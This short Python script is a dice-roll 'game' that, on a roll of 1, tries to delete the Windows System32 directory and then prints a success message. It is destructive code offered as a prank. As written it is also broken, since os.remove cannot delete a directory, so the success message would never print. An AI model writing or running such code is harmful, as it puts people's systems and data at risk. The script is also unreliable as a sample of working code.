import random
import os

# Generate a random number between 1 and 6
result = random.randint(1, 6)

#If the result is 1, simulate "losing" the game and delete the system file
if result == 1:
  os.remove('C:/Windows/System32')
  print("File deleted successfully!")
else:
  print("You win!")
